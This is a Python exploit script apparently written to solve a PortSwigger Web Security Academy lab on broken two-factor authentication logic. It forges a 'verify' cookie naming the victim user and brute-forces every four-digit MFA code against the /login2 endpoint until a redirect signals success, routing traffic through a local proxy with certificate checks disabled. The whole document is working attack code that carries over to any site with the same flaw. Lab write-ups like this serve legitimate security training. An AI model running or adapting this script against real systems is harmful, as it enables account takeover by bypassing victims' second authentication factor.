# https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic
# Sending victim request and brute force mfa code

import urllib3
import sys
import requests
import threading
import queue

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def bruteForce(url):

    username = "carlos"

    print("[ + ] Generating request for user %s...\n" % (username))

    mfaUrl = url + "/login2"

    cookies = {'verify':username}

    rUsername = requests.get(mfaUrl, verify=False, proxies=proxies, cookies=cookies)

    for i in range(9999):

        padded_number = str(i).zfill(4)

        params = { 
        "mfa-code": padded_number
        }

        rMFA = requests.post(mfaUrl, verify=False, proxies=proxies, data=params, cookies=cookies)

        sys.stdout.write('\r' + "Brute Forcing MFA Code: " + padded_number)
        print(" "*50, end='\r', flush=True)

        if rMFA.status_code == 302:
            mfaCode = padded_number
            print("\n\n------------------------------------")
            print("MFA found: " + mfaCode)
            print("------------------------------------")
            break
 
def main():
    if len(sys.argv) != 2:
        print("Usage: %s <URL>" % sys.argv[0])
        print("Example: %s https://victim.com" % sys.argv[0])

    url = sys.argv[1]
    bruteForce(url)

if __name__ == "__main__":
    main() 
